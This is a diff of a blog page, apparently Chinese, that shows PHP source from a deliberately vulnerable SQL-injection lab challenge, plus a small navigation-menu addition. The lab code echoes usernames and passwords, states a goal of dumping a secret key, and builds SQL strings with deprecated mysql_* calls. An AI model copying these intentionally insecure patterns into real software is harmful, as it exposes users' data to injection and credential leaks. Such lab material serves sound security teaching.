-                echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-                echo &quot;&lt;br&gt;&quot;;
-                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-                echo &quot;&lt;/font&gt;&quot;;
+                echo '&lt;font color= "#00FFFF"&gt;';    
+                echo 'Your Login name:'. $row['username'];
+                echo "&lt;br&gt;";
+                echo 'Your Password:' .$row['password'];
+                echo "&lt;/font&gt;";
             }
             else {
-                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+                echo '&lt;font color= "#FFFF00"&gt;';
 //                print_r(mysql_error());
-                echo &quot;&lt;/font&gt;&quot;;  
+                echo "&lt;/font&gt;";  
             }
         }
         else{
-            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;
-            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;
-            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;
+            echo "Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;";
+            echo "&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;";
+            echo "For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;" ;
         }
     }
 }
@@ -837,30 +862,30 @@ if(!isset($_POST[&#39;answer_key&#39;])){
 <p>==答案提交部分==</p>
 <pre><code class="php">else
 {
-    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;
-    $key = addslashes($_POST[&#39;key&#39;]);
+    echo '&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;';
+    $key = addslashes($_POST['key']);
     $key = mysql_real_escape_string($key);
     //echo $key;
     /Query table to verify your result
-    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;
-    //echo &quot;$sql&quot;;
-    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());
+    $sql="SELECT 1 FROM $table WHERE $col1= '$key'";
+    //echo "$sql";
+    $result=mysql_query($sql)or die("error in submittion of Key Solution".mysql_error());
     $row = mysql_fetch_array($result);
     if($row)
     {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;
-        echo &quot;&lt;/font&gt;&quot;; 
-        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );    
+        echo '&lt;font color= "#FFFF00"&gt;';
+        echo "\n&lt;br&gt;&lt;br&gt;&lt;br&gt;";
+        echo '&lt;img src="../images/Less-54-1.jpg" /&gt;';
+        echo "&lt;/font&gt;"; 
+        header( "refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag" );    
     }
     else {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;
-        header( &quot;refresh:3;url=index.php&quot; );
+        echo '&lt;font color= "#FFFF00"&gt;';
+        echo "\n&lt;br&gt;&lt;br&gt;&lt;br&gt;";
+        echo '&lt;img src="../images/slap1.jpg" /&gt;';
+        header( "refresh:3;url=index.php" );
         //print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
+        echo "&lt;/font&gt;";  
         }    
 }
 ?&gt;
@@ -1253,6 +1278,27 @@ gitalk.render('gitalk-container')
                 <a href="/categories/资源/">
                   <i class="fa fa-cloud-download" aria-hidden="true"></i>
                   资源
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/fanju/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  追剧
                 </a>
               </li>
             
